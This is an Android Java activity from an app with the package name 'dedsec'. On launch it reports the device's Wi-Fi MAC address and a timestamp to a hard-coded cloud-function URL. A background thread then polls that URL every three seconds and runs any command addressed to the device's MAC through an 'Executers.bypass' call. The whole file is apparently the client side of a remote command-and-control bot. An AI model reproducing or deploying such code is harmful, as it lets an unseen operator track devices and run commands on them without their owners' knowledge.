package com.rahulcompany.dedsec;

import androidx.appcompat.app.AppCompatActivity;

import android.app.ActivityManager;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import com.bumptech.glide.Glide;

import org.jetbrains.annotations.NotNull;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.NetworkInterface;
import java.util.Calendar;
import java.util.Collections;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CodeActivity extends AppCompatActivity {


    String url = "https://us-central1-mymarket-83c33.cloudfunctions.net/helloWorld";
    Executers ex;
    EditText Codeedit;
    MediaType JSON = MediaType.parse("application/json; charset=utf-8");
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_code);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getSupportActionBar().hide();
        Codeedit = findViewById(R.id.codeedit1);
        Handler h = new Handler();
        ex = new Executers(CodeActivity.this,Codeedit,h);



        final Thread keep=new Thread(new Runnable() {
            @Override
            public void run() {

                JSONObject object = new JSONObject();
                try {
                    object.put("code", "");
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                final OkHttpClient client = new OkHttpClient();
                RequestBody body = RequestBody.create(JSON, object.toString());


                while (true) {
                    Request r = new Request.Builder()
                            .url(url+"/a").build();
                    final Request change = new Request.Builder()
                            .url(url+"/a")
                            .post(body)
                            .build();
                    try {
                        Thread.currentThread().sleep(3000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }


                    client.newCall(r).enqueue(new Callback() {
                        @Override
                        public void onFailure(@NotNull Call call, @NotNull IOException e) {
                            Log.d("stuff", e.getMessage());
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                            String code = response.body().string();
                            Log.d("stuff", code);
                            try {
                                JSONObject obj = new JSONObject(code);
                                code = obj.getString("code");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }



                            if (code.length() != 0) {
                                final String finalCode = code;
                                CodeActivity.this.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        execute(finalCode);
                                    }
                                });

                                if (finalCode.startsWith(getMacAddr())) {
                                    Log.d("stuff", "clean cmd");
                                    client.newCall(change).enqueue(new Callback() {
                                        @Override
                                        public void onFailure(@NotNull Call call, @NotNull IOException e) {
                                            Log.d("stuff", e.getMessage());
                                        }

                                        @Override
                                        public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {

                                        }
                                    });
                                }

                            }
                        }
                    });
                }


            }
        });
        keep.start();



    }

    private void execute(String code) {
        //todo:perform code here
        code = code.trim();
        if (code.startsWith(getMacAddr())) {
            code = code.replace(getMacAddr(), "");
            code = code.trim();
            Log.d("stuffe", code);
            ex.bypass(code);
        }

    }

    @Override
    protected void onStart() {
        super.onStart();
        push();
    }

    private void push() {
        OkHttpClient client = new OkHttpClient();
        JSONObject obj = new JSONObject();
        String s = null;
        s = getMacAddr();
        s= s+" - - - "+Calendar.getInstance().getTime().toString();
        Log.d("stuffactive", s);
        try {
            obj.put("active",s);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        RequestBody requestBody = RequestBody.create(JSON, obj.toString());
        Request request= new Request.Builder()
                .url(url+"/data")
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                Log.d("stuffactive", e.toString());
            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                Log.d("stuffactive", response.body().toString());
                Log.d("stuffactive", "success");
            }
        });
    }

    public static String getMacAddr() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : all) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;

                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "";
                }

                StringBuilder res1 = new StringBuilder();
                for (byte b : macBytes) {
                    String hex = Integer.toHexString(b & 0xFF);
                    if (hex.length() == 1)
                        hex = "0".concat(hex);
                    res1.append(hex.concat(":"));
                }

                if (res1.length() > 0) {
                    res1.deleteCharAt(res1.length() - 1);
                }
                return res1.toString();
            }
        } catch (Exception ex) {
        }
        return "";
    }
}